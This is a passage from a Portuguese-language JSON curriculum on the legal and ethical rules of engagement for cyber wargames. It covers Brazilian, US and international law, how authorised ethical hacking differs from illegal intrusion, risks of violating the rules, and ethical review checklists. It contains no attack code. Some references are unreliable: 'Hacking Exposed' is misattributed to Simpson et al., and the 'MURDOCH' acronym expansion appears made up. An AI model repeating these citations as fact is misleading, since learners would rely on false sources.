                                  "learningObjective": "Dominar o arcabouço internacional que regula ciberoperações ofensivas e protege soberania.",
                                  "commonMistakes": [
                                    "Confundir normas não vinculantes (Tallinn) com tratados obrigatórios",
                                    "Ignorar adesões parciais de países a convenções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear legislações às Regras de Engajamento (ROE) em jogos de guerra cibernética",
                                  "subSteps": [
                                    "Criar um quadro comparativo: leis x tipos de ações ofensivas (ex: DDoS, malware, phishing)",
                                    "Relacionar restrições legais a thresholds de ROE (ex: proibições em alvos civis pela LGPD)",
                                    "Simular cenários de wargame: mapear violações potenciais em ataques simulados",
                                    "Definir 'zonas vermelhas' legais para ROE (ações proibidas por lei)",
                                    "Redigir recomendações para conformidade em exercícios cibernéticos"
                                  ],
                                  "verification": "Quadro final de mapeamento com 10+ entradas relacionando leis a ROE, revisado por pares",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets",
                                    "Documentos dos steps anteriores",
                                    "Templates de ROE de wargames cibernéticos (ex: de NATO CCDCOE)"
                                  ],
                                  "tips": "Use cores no quadro: verde (permitido), amarelo (restrito), vermelho (proibido) para visualização rápida.",
                                  "learningObjective": "Integrar conhecimento legal a ROE práticas para operações cibernéticas éticas e legais.",
                                  "commonMistakes": [
                                    "Sobrestimar flexibilidade das ROE ignorando sanções internacionais",
                                    "Não considerar escalada legal em respostas a violações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético simulando defesa contra ataque russo a infraestrutura brasileira, mapear que um contra-ataque ofensivo acessando dados pessoais violaria LGPD (sanções por vazamento), CFAA se alvos tivessem nexos EUA, e Tallinn Manual (interferência em soberania), restringindo ROE a defesas passivas apenas.",
                              "finalVerifications": [
                                "Quadro legal completo com pelo menos 10 legislações/normas mapeadas",
                                "Relações explícitas entre leis e 5+ cenários de ROE em wargames",
                                "Identificação de 3-5 restrições chave por jurisdição",
                                "Exemplos de conformidade e não-conformidade em simulações",
                                "Referências bibliográficas com links para textos legais",
                                "Autoavaliação de gaps no mapeamento"
                              ],
                              "assessmentCriteria": [
                                "Precisão e atualidade das leis citadas (sem erros factuais)",
                                "Profundidade na análise de restrições específicas a cyber ops ofensivas",
                                "Clareza e usabilidade do quadro de mapeamento para ROE",
                                "Integração interdisciplinar (legal + operacional cibernético)",
                                "Criatividade em exemplos práticos e cenários wargame",
                                "Completude: cobertura Brasil, EUA e internacional"
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional e Relações Internacionais (soberania cibernética)",
                                "Ética Aplicada à Tecnologia (dilemas em wargames)",
                                "Governança de TI e Compliance Corporativo",
                                "História Militar (evolução de ROE em conflitos cibernéticos)",
                                "Política Pública (políticas nacionais de cibersegurança)"
                              ],
                              "realWorldApplication": "Em centros de operações cibernéticas militares ou agências como ABIN/ANPD no Brasil, este mapeamento garante que equipes de red team em exercícios respeitem leis, evitando incidentes diplomáticos ou judiciais em operações reais contra ameaças estatais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.2",
                            "name": "Diferenciar legalidade de ethical hacking autorizado",
                            "description": "Compreender as diferenças entre hacking ético legalizado via ROE e atividades ilegais, usando exemplos de livros como SIMPSON et al.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Conceituar Ethical Hacking e Hacking Ilegal",
                                  "subSteps": [
                                    "Definir ethical hacking como prática autorizada de simulação de ataques para identificar vulnerabilidades.",
                                    "Explicar hacking ilegal como acesso não autorizado a sistemas, violando leis como a LGPD ou Código Penal.",
                                    "Listar diferenças iniciais: autorização, intenção e contexto legal.",
                                    "Pesquisar definições em fontes confiáveis como NIST ou livros de Simpson et al.",
                                    "Criar um glossário pessoal com termos chave."
                                  ],
                                  "verification": "Produzir um resumo escrito de 200 palavras comparando os conceitos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Hacking Exposed' de Simpson et al.",
                                    "Documentos NIST SP 800-115",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use diagramas Venn para visualizar sobreposições e diferenças.",
                                  "learningObjective": "Compreender definições fundamentais e distinções conceituais.",
                                  "commonMistakes": [
                                    "Confundir ethical hacking com 'hacking bom' sem base legal.",
                                    "Ignorar contextos internacionais de legalidade."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Regras de Engajamento (ROE) em Ethical Hacking",
                                  "subSteps": [
                                    "Explicar ROE como conjunto de regras que definem ações permitidas em testes autorizados.",
                                    "Analisar componentes de ROE: escopo, métodos, limites e relatórios.",
                                    "Ler exemplos de ROE em contratos de pentest de Simpson et al.",
                                    "Comparar ROE com autorizações em leis como Marco Civil da Internet.",
                                    "Simular redação de uma ROE simples para um cenário fictício."
                                  ],
                                  "verification": "Redigir uma ROE modelo e justificar sua legalidade.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de ROE online (SANS Institute)",
                                    "Livro Simpson et al.",
                                    "Editor de texto"
                                  ],
                                  "tips": "Sempre inclua cláusulas de confidencialidade e notificação de vulnerabilidades.",
                                  "learningObjective": "Dominar o papel das ROE na legalização de atividades de hacking.",
                                  "commonMistakes": [
                                    "Subestimar a necessidade de aprovação escrita.",
                                    "Confundir ROE com licenças de software."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Analisar Exemplos de Atividades Ilegais",
                                  "subSteps": [
                                    "Listar crimes cibernéticos: invasão de dispositivo (art. 154-A CP), fraudes.",
                                    "Estudar casos reais de hacking ilegal vs ethical (ex: Equifax breach vs pentests autorizados).",
                                    "Referenciar Simpson et al. para exemplos de black hat vs white hat.",
                                    "Mapear consequências legais: multas, prisão, responsabilidade civil.",
                                    "Criar tabela comparativa de cenários legais e ilegais."
                                  ],
                                  "verification": "Apresentar tabela com 5 exemplos diferenciados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Código Penal Brasileiro",
                                    "Casos judiciais no STF",
                                    "Livro Simpson et al."
                                  ],
                                  "tips": "Foco em intenção: profit vs proteção.",
                                  "learningObjective": "Reconhecer marcadores de ilegalidade em ações de hacking.",
                                  "commonMistakes": [
                                    "Generalizar todos os hacks como ilegais.",
                                    "Ignorar jurisdições diferentes."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar na Prática com Análise de Casos",
                                  "subSteps": [
                                    "Analisar caso 1: Pentest autorizado com ROE vs hacking sem permissão.",
                                    "Aplicar framework: autorização > escopo > documentação > relatório.",
                                    "Usar exemplos de Simpson et al. para validação.",
                                    "Debater dilemas éticos em grupo ou auto-reflexão.",
                                    "Testar conhecimento com quiz de cenários."
                                  ],
                                  "verification": "Resolver 5 cenários e classificar como legal/ilegal com justificativa.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Quiz online sobre ethical hacking",
                                    "Livro Simpson et al.",
                                    "Fórum de discussão"
                                  ],
                                  "tips": "Sempre pergunte: 'Há autorização explícita por escrito?'",
                                  "learningObjective": "Aplicar diferenciação em cenários reais.",
                                  "commonMistakes": [
                                    "Assumir verbal OK sem escrito.",
                                    "Misturar ética com legalidade."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa X, um consultor contrata ethical hacker com ROE para testar servidores (legal: escopo definido, relatório entregue). Já um ex-funcionário acessa rede sem permissão para vingar-se (ilegal: sem ROE, viola art. 154-A CP, punível com prisão).",
                              "finalVerifications": [
                                "Explicar ROE em 3 minutos sem erros.",
                                "Classificar 5 cenários como legal/ilegal corretamente.",
                                "Citar 2 exemplos de Simpson et al.",
                                "Redigir cláusula básica de ROE.",
                                "Identificar 3 crimes cibernéticos associados a hacking ilegal.",
                                "Diferenciar em diagrama conceitual."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção legal vs ilegal (30%)",
                                "Uso correto de ROE e exemplos bibliográficos (25%)",
                                "Profundidade em subpassos e verificações (20%)",
                                "Clareza em exemplos práticos (15%)",
                                "Aplicação interdisciplinar (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Direito: Legislação penal e civil cibernética.",
                                "Ética: Dilemas morais em TI.",
                                "História: Evolução de leis cibernéticas pós-incidentes.",
                                "Comunicação: Redação de ROE e relatórios."
                              ],
                              "realWorldApplication": "Em operações de cibersegurança empresarial, profissionais usam essa distinção para conduzir pentests legais, evitando processos judiciais e protegendo a organização, como em certificações CEH ou contratos governamentais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.3",
                            "name": "Avaliar riscos legais de violação de ROE",
                            "description": "Simular cenários de não conformidade com ROE e identificar consequências legais, como responsabilização civil ou penal.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de ROE e Quadro Legal Aplicável",
                                  "subSteps": [
                                    "Estudar a definição e propósito das Regras de Engajamento (ROE) em operações cibernéticas.",
                                    "Identificar leis nacionais e internacionais relevantes, como Convenção de Genebra, Direito Internacional Humanitário e legislações cibernéticas (ex: LGPD, GDPR).",
                                    "Analisar diferenças entre responsabilização civil e penal em contextos de ciberoperações.",
                                    "Mapear jurisdições envolvidas em cenários transfronteiriços.",
                                    "Compilar um glossário de termos legais chave."
                                  ],
                                  "verification": "Criar um resumo de 1 página listando 5 leis principais e suas implicações para ROE.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentos oficiais de ROE",
                                    "Textos de leis internacionais (ONU, Convenções de Genebra)",
                                    "Artigos acadêmicos sobre direito cibernético"
                                  ],
                                  "tips": [
                                    "Priorize fontes primárias como tratados internacionais.",
                                    "Use diagramas para mapear hierarquia legal.",
                                    "Considere contextos de guerra cibernética híbrida."
                                  ],
                                  "learningObjective": "Compreender o arcabouço legal que rege as ROE em ciberoperações.",
                                  "commonMistakes": [
                                    "Confundir ROE com regras táticas puras.",
                                    "Ignorar leis de neutralidade em ciberespaço.",
                                    "Subestimar impactos de jurisdições estrangeiras."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Cenários Potenciais de Não Conformidade com ROE",
                                  "subSteps": [
                                    "Listar ações cibernéticas comuns que podem violar ROE (ex: DDoS em infraestrutura civil, roubo de dados soberanos).",
                                    "Classificar violações por tipo: intencional, acidental ou por falha de comunicação.",
                                    "Definir indicadores de não conformidade baseados em ROE específicas.",
                                    "Criar matriz de riscos iniciais com probabilidade e impacto.",
                                    "Consultar casos históricos reais de violações cibernéticas."
                                  ],
                                  "verification": "Produzir uma tabela com 10 cenários potenciais e suas violações associadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Templates de matriz de riscos",
                                    "Relatórios de incidentes cibernéticos (ex: SolarWinds, NotPetya)",
                                    "Guias de ROE de exercícios passados"
                                  ],
                                  "tips": [
                                    "Use brainstorming para gerar cenários realistas.",
                                    "Inclua perspectivas de atores adversários.",
                                    "Valide cenários com checklists de ROE."
                                  ],
                                  "learningObjective": "Reconhecer padrões de ações que levam a violações de ROE.",
                                  "commonMistakes": [
                                    "Focar apenas em violações graves, ignorando menores cumulativas.",
                                    "Não considerar cadeias de comando.",
                                    "Generalizar cenários sem contexto operacional."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Cenários de Violação e Mapear Consequências Legais",
                                  "subSteps": [
                                    "Selecionar 3 cenários da etapa anterior e simular em role-playing ou ferramenta de simulação.",
                                    "Analisar passo a passo como a ação viola ROE e aciona mecanismos legais.",
                                    "Identificar consequências: civis (indenizações, sanções), penais (prisão, julgamentos) e institucionais (investigações).",
                                    "Quantificar riscos usando escalas qualitativas/quantitativas.",
                                    "Documentar cadeia de eventos em diagrama de fluxo."
                                  ],
                                  "verification": "Gravar ou relatar simulação com identificação de pelo menos 4 consequências por cenário.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ferramentas de simulação cibernética (ex: Cyber Range)",
                                    "Softwares de diagramação (Draw.io)",
                                    "Casos judiciais cibernéticos"
                                  ],
                                  "tips": [
                                    "Envolva pares para role-playing realista.",
                                    "Registre timestamps de decisões críticas.",
                                    "Simule respostas legais de múltiplas jurisdições."
                                  ],
                                  "learningObjective": "Simular dinâmicas de violação para prever desdobramentos legais.",
                                  "commonMistakes": [
                                    "Simulações superficiais sem profundidade legal.",
                                    "Ignorar defesas como 'boa-fé' ou 'necessidade militar'.",
                                    "Não escalar para níveis internacionais."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Riscos Legais e Desenvolver Mitigações",
                                  "subSteps": [
                                    "Pontuar riscos por gravidade, probabilidade e mitigabilidade.",
                                    "Propor medidas preventivas: treinamentos, aprovações prévias, auditorias.",
                                    "Elaborar plano de resposta a incidentes de violação.",
                                    "Avaliar custos-benefícios de ações sob ROE estritas vs. flexíveis.",
                                    "Revisar e refinar avaliação com feedback simulado."
                                  ],
                                  "verification": "Entregar relatório final com matriz de riscos e 5 mitigações acionáveis.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Modelos de plano de mitigação",
                                    "Ferramentas de análise de risco (Excel, Risk Matrix)",
                                    "Diretrizes de compliance cibernético"
                                  ],
                                  "tips": [
                                    "Use escala 1-10 para priorizar riscos.",
                                    "Integre lições de simulações anteriores.",
                                    "Considere atualizações legais em tempo real."
                                  ],
                                  "learningObjective": "Formular avaliações de risco legais completas com estratégias de mitigação.",
                                  "commonMistakes": [
                                    "Sobrestimar defesas legais sem precedentes.",
                                    "Não quantificar impactos financeiros.",
                                    "Ignorar riscos reputacionais além do legal."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética, um operador lança um ataque de negação de serviço (DDoS) contra um hospital em território inimigo sem verificação de ROE, violando proibições contra alvos civis. Isso resulta em responsabilização penal por crimes de guerra (Direito Internacional Humanitário) e civil por danos materiais, com sanções internacionais impostas ao Estado.",
                              "finalVerifications": [
                                "Pode simular 3 cenários e listar consequências legais precisas para cada.",
                                "Identifica corretamente diferenças entre riscos civis e penais em 90% dos casos.",
                                "Cria matriz de riscos com mitigações viáveis.",
                                "Explica impactos de jurisdições múltiplas em cenários transfronteiriços.",
                                "Demonstra compreensão de ROE através de exemplos históricos.",
                                "Propõe plano de resposta a violações com passos acionáveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de violações de ROE (80%+ acurácia).",
                                "Profundidade na análise de consequências legais (civis, penais, institucionais).",
                                "Qualidade e realismo dos cenários simulados.",
                                "Completude das mitigações propostas (cobertura de prevenção e resposta).",
                                "Clareza e estruturação dos relatórios e diagramas.",
                                "Integração de conhecimentos interdisciplinares (direito, operações)."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional e Humanitário",
                                "Ética em Operações Cibernéticas",
                                "Gestão de Riscos e Compliance",
                                "Simulações e Treinamentos Militares",
                                "Inteligência e Análise Situacional"
                              ],
                              "realWorldApplication": "Em operações de defesa cibernética nacional, como resposta a ataques estatais, avaliando riscos antes de contra-ataques para evitar violações de ROE que levem a processos no Tribunal Penal Internacional ou sanções da ONU, garantindo legitimidade e proteção a operadores."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.4",
                            "name": "Documentar conformidade legal nas ROE",
                            "description": "Praticar a redação de cláusulas em ROE que garantam aderência legal, incluindo escopos de autorização e relatórios de atividades.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar o quadro legal aplicável às ROE",
                                  "subSteps": [
                                    "Identificar leis nacionais e internacionais relevantes, como Convenção de Genebra, Direito Internacional Humanitário e legislações cibernéticas (ex: Lei Geral de Proteção de Dados - LGPD no Brasil).",
                                    "Analisar precedentes jurídicos em operações cibernéticas, como Tallinn Manual.",
                                    "Mapear obrigações específicas para ROE em contextos de jogos de guerra cibernéticos.",
                                    "Compilar uma lista de requisitos legais obrigatórios para conformidade.",
                                    "Documentar fontes primárias e secundárias consultadas."
                                  ],
                                  "verification": "Lista de leis e regulamentos mapeados com resumo de aplicabilidade às ROE.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso a bases jurídicas (ex: Planalto.gov.br, ONU.org), Tallinn Manual 2.0, artigos acadêmicos sobre direito cibernético"
                                  ],
                                  "tips": "Priorize fontes oficiais e atualizadas; use ferramentas como Google Scholar para buscas avançadas.",
                                  "learningObjective": "Compreender o arcabouço legal que rege operações cibernéticas e sua integração em ROE.",
                                  "commonMistakes": [
                                    "Ignorar diferenças entre direito nacional e internacional",
                                    "Não considerar evoluções recentes em tratados cibernéticos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir escopos de autorização legais nas ROE",
                                  "subSteps": [
                                    "Delimitar ações permitidas com base em proporcionalidade e distinção (alvos militares vs. civis).",
                                    "Especificar limites geográficos, temporais e de intensidade para autorizações.",
                                    "Incluir critérios para escalonamento de respostas cibernéticas.",
                                    "Garantir alinhamento com princípios de necessidade e humanidade.",
                                    "Rascunhar cláusulas preliminares de autorização com referências legais."
                                  ],
                                  "verification": "Rascunho de cláusulas de escopo com citações legais explícitas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Modelos de ROE de exercícios militares públicos, templates jurídicos de autorizações"
                                  ],
                                  "tips": "Use linguagem precisa e condicional para evitar ambiguidades.",
                                  "learningObjective": "Mapear e delimitar autorizações legais para prevenir violações em cenários operacionais.",
                                  "commonMistakes": [
                                    "Definir escopos muito amplos sem salvaguardas",
                                    "Omitir cenários de escalada não autorizada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Redigir cláusulas de relatórios de atividades e conformidade",
                                  "subSteps": [
                                    "Estruturar relatórios obrigatórios para todas as ações executadas, incluindo logs de atividades cibernéticas.",
                                    "Incluir mecanismos de auditoria e notificação a autoridades legais.",
                                    "Definir formatos padronizados para relatórios (ex: who, what, when, where, why).",
                                    "Incorporar cláusulas de cessação imediata em caso de não conformidade.",
                                    "Testar redação com exemplos hipotéticos de violações."
                                  ],
                                  "verification": "Cláusulas de relatório redigidas e revisadas por pares simulados.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Softwares de edição de texto (Word/Google Docs), exemplos de relatórios de incidentes cibernéticos (NIST IR 7622)"
                                  ],
                                  "tips": "Inclua prazos curtos para relatórios para manter accountability.",
                                  "learningObjective": "Criar mecanismos documentados para transparência e accountability legal.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem métricas quantificáveis",
                                    "Falta de integração com sistemas de logging automatizados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar, revisar e validar a documentação nas ROE",
                                  "subSteps": [
                                    "Inserir cláusulas no documento principal de ROE com numeração sequencial.",
                                    "Realizar revisão cruzada com checklist de conformidade legal.",
                                    "Simular cenários de uso e identificar gaps legais.",
                                    "Obter feedback de especialistas simulados (ex: role-playing como advogado).",
                                    "Finalizar versão com assinaturas e data de vigência."
                                  ],
                                  "verification": "ROE completa com cláusulas integradas e relatório de revisão.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Checklist de conformidade legal personalizada, ferramentas de revisão colaborativa (Google Docs)"
                                  ],
                                  "tips": "Use versionamento (ex: Git) para rastrear mudanças nas ROE.",
                                  "learningObjective": "Garantir que a documentação seja robusta, auditável e pronta para uso operacional.",
                                  "commonMistakes": [
                                    "Não versionar alterações",
                                    "Ignorar feedback externo na revisão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando defesa contra ataque russo a redes ucranianas, redija a cláusula: 'Todas as ações ofensivas devem respeitar o Artigo 51 da Carta da ONU para legítima defesa, com relatório imediato ao comando legal se houver impacto em infraestruturas civis, incluindo logs de IP e timestamps, sob pena de cessação automática.'",
                              "finalVerifications": [
                                "Cláusulas citam leis específicas com artigos e fontes.",
                                "Escopos de autorização incluem limites claros de proporcionalidade.",
                                "Relatórios cobrem todos os elementos WH-questions (who, what, when, where, why).",
                                "Documentação é integrada coerentemente às ROE existentes.",
                                "Simulação de cenário valida ausência de ambiguidades legais.",
                                "Checklist de revisão confirma 100% de cobertura de requisitos."
                              ],
                              "assessmentCriteria": [
                                "Precisão jurídica: 30% (citações corretas e aplicáveis).",
                                "Clareza e objetividade da redação: 25%.",
                                "Completude dos escopos e relatórios: 20%.",
                                "Robustez contra erros comuns: 15%.",
                                "Integração e usabilidade prática: 10%."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional e Humanitário",
                                "Ética em Operações Cibernéticas",
                                "Gestão de Riscos e Compliance",
                                "Redação Técnica e Jurídica",
                                "Inteligência Situacional"
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares reais, como as da OTAN em exercícios Locked Shields, ROE documentadas previnem violações internacionais, facilitam auditorias pós-operação e protegem contra litígios em tribunais como o TPI."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.3",
                        "name": "Integração Ética e Legal nas ROE para Jogos de Guerra Cibernética",
                        "description": "Estratégias para incorporar ética e legalidade nas ROE durante planejamento e execução de cenários de Red Team em ambientes simulados.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.3.1",
                            "name": "Desenvolver ROE com cláusulas éticas explícitas",
                            "description": "Criar templates de ROE que incluam verificações éticas, como 'regras de desengajamento' e critérios de sucesso sem danos reais, inspirado em MURDOCH.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Fundamentos Éticos e Legais para ROE em Operações Cibernéticas",
                                  "subSteps": [
                                    "Pesquisar princípios éticos como proporcionalidade, distinção e necessidade em ciberoperações, inspirados em convenções como Genebra e Tallinn Manual.",
                                    "Analisar exemplos de ROE reais ou simulados de exercícios como Locked Shields ou Cyber Flag.",
                                    "Identificar frameworks como MURDOCH (Moral, Understandable, Reviewable, Documented, Operational, Clear, Harm-minimizing).",
                                    "Mapear leis aplicáveis: GDPR, Convenção de Budapeste e regulamentações nacionais de ciberdefesa.",
                                    "Compilar uma lista de 5-10 princípios éticos chave para ROE."
                                  ],
                                  "verification": "Criar um resumo de 1 página com princípios identificados e fontes citadas.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Tallinn Manual PDF, site da NATO CCDCOE, artigos sobre MURDOCH, convenções internacionais online.",
                                  "tips": "Use ferramentas como Zotero para organizar referências e evitar plágio.",
                                  "learningObjective": "Compreender a base ética e legal que sustenta cláusulas em ROE cibernéticas.",
                                  "commonMistakes": "Ignorar contextos culturais ou regionais nas leis internacionais; confundir ética com conformidade legal apenas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Cláusulas Éticas Explícitas Essenciais",
                                  "subSteps": [
                                    "Listar cláusulas obrigatórias: regras de desengajamento (ex: abortar se risco a civis > 20%), proibição de danos colaterais reais.",
                                    "Definir critérios de sucesso éticos: métricas como 'zero impacto em infraestrutura crítica civil'.",
                                    "Incluir verificações pré-engajamento: checklist de aprovação ética por comitê.",
                                    "Especificar triggers para escalonamento ético: relatar anomalias em tempo real.",
                                    "Priorizar cláusulas inspiradas em MURDOCH, garantindo clareza e mensurabilidade."
                                  ],
                                  "verification": "Produzir uma tabela com 8-10 cláusulas éticas, incluindo descrição, trigger e consequência.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Planilha Google Sheets ou Excel, templates de checklists éticos de fontes como ENISA.",
                                  "tips": "Use linguagem condicional (if-then) para tornar cláusulas acionáveis.",
                                  "learningObjective": "Selecionar e formular cláusulas éticas precisas e integráveis em ROE.",
                                  "commonMistakes": "Cláusulas vagas como 'evitar danos'; não incluir métricas quantificáveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estruturar o Template de ROE com Integração Ética",
                                  "subSteps": [
                                    "Criar seções do template: Introdução, Objetivos, Cláusulas Gerais, Cláusulas Éticas Explícitas, Procedimentos de Verificação.",
                                    "Inserir cláusulas éticas do Step 2 nas seções apropriadas, com formatação hierárquica.",
                                    "Adicionar anexos: fluxogramas de decisão ética e formulários de relatório.",
                                    "Garantir compatibilidade com cenários de jogos de guerra cibernética (ex: simulações sem danos reais).",
                                    "Revisar por completude: cada cláusula deve ter definição, aplicação e sanção."
                                  ],
                                  "verification": "Gerar um documento draft de template ROE com pelo menos 5 páginas.",
                                  "estimatedTime": "5 horas",
                                  "materials": "Google Docs ou Microsoft Word, ferramentas de diagrama como Lucidchart para fluxogramas.",
                                  "tips": "Teste legibilidade imprimindo e simulando uma leitura rápida em 5 minutos.",
                                  "learningObjective": "Construir um template ROE robusto e éticamente integrado.",
                                  "commonMistakes": "Sobrecarregar com jargão técnico; omitir seções de revisão pós-engajamento."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, Testar e Refinar o Template ROE",
                                  "subSteps": [
                                    "Simular cenários: aplicar o template em 3 casos hipotéticos de jogos de guerra cibernética.",
                                    "Coletar feedback: compartilhar com pares ou mentor para revisão ética.",
                                    "Realizar verificações finais: checar por lacunas em desengajamento ou danos potenciais.",
                                    "Iterar: ajustar cláusulas baseadas em simulações e feedback.",
                                    "Documentar lições aprendidas e versão final com histórico de mudanças."
                                  ],
                                  "verification": "Produzir relatório de validação com resultados de simulações e versão final do template.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas de simulação como Cyber Range virtual, formulários de feedback online (Google Forms).",
                                  "tips": "Grave simulações em vídeo para análise posterior.",
                                  "learningObjective": "Garantir que o ROE seja prático, ético e testado em contextos reais simulados.",
                                  "commonMistakes": "Testes superficiais sem cenários adversos; ignorar feedback crítico."
                                }
                              ],
                              "practicalExample": "Template ROE Exemplo: Seção Ética - Cláusula 1: Desengajamento Imediato - 'Se exploit afetar >5% de tráfego civil (medido por Wireshark), abortar operação e notificar comando em <2min'. Critério Sucesso: Simulação completa sem alertas éticos disparados, conforme log MURDOCH.",
                              "finalVerifications": [
                                "Template possui pelo menos 8 cláusulas éticas explícitas com triggers mensuráveis.",
                                "Simulações em 3 cenários confirmam ausência de violações éticas.",
                                "Checklist de verificação ética 100% integrada e testada.",
                                "Feedback de revisão externa incorporado (mínimo 80% aprovação).",
                                "Versão final inclui fluxograma de decisão e histórico de revisões.",
                                "Compatibilidade com frameworks como MURDOCH verificada."
                              ],
                              "assessmentCriteria": [
                                "Profundidade e precisão das cláusulas éticas (30%).",
                                "Estrutura clara e acionável do template (25%).",
                                "Evidências de pesquisa e referências (20%).",
                                "Resultados de simulações e validações (15%).",
                                "Integração de feedback e iterações (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Ética Filosófica: Análise de dilemas morais em decisões cibernéticas.",
                                "Direito Internacional: Aplicação de tratados humanitários em ciberespaço.",
                                "Psicologia: Fatores humanos em adesão a ROE sob pressão.",
                                "Gestão de Projetos: Desenvolvimento iterativo de políticas."
                              ],
                              "realWorldApplication": "Em exercícios de red teaming ético da NATO ou DEF CON, onde ROE com cláusulas éticas previnem escaladas reais, como no caso de simulações que evitaram vazamentos de dados civis em testes de penetração governamentais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.2",
                            "name": "Realizar revisões éticas pré-operacionais",
                            "description": "Estabelecer checklists para revisão de ROE antes de exercícios, cobrindo consciência situacional e indicadores de compromisso éticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Desenvolver o checklist base para revisões éticas pré-operacionais",
                                  "subSteps": [
                                    "Identificar os componentes essenciais das ROE relevantes para operações cibernéticas, incluindo limites éticos e legais.",
                                    "Listar itens obrigatórios como conformidade com leis internacionais de guerra cibernética e princípios humanitários.",
                                    "Estruturar o checklist em seções claras: introdução, verificações éticas principais e assinatura de aprovação.",
                                    "Consultar diretrizes éticas de organizações como o Tallinn Manual para embasar os itens.",
                                    "Revisar o rascunho com stakeholders iniciais para feedback preliminar."
                                  ],
                                  "verification": "Checklist base documentado com pelo menos 10 itens iniciais e estrutura aprovada por um revisor.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentos de ROE, Tallinn Manual PDF, template de checklist em Google Docs ou Excel.",
                                  "tips": "Use linguagem simples e checkboxes para facilitar o uso em campo.",
                                  "learningObjective": "Criar uma estrutura padronizada para checklists éticos que cubra fundamentos de ROE cibernéticas.",
                                  "commonMistakes": "Ignorar contextos específicos de ciberoperações, como escalada digital não intencional."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Integrar verificações de consciência situacional nas ROE",
                                  "subSteps": [
                                    "Mapear elementos de consciência situacional: identificação de alvos civis vs. militares em redes cibernéticas.",
                                    "Adicionar itens para avaliar inteligência pré-operacional, como mapeamento de infraestruturas críticas.",
                                    "Incluir perguntas sobre cenários de escalada, como ataques colaterais em redes compartilhadas.",
                                    "Definir métricas qualitativas para nível de consciência, e.g., 'alta/média/baixa'.",
                                    "Testar itens com um cenário simulado hipotético."
                                  ],
                                  "verification": "Seção de consciência situacional adicionada com 5-7 itens específicos e testada em simulação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Relatórios de inteligência simulados, ferramentas de modelagem de rede como Wireshark ou diagramas Visio.",
                                  "tips": "Priorize riscos de 'dano colateral cibernético' em infraestruturas civis.",
                                  "learningObjective": "Incorporar consciência situacional para prevenir violações éticas inadvertidas em jogos de guerra.",
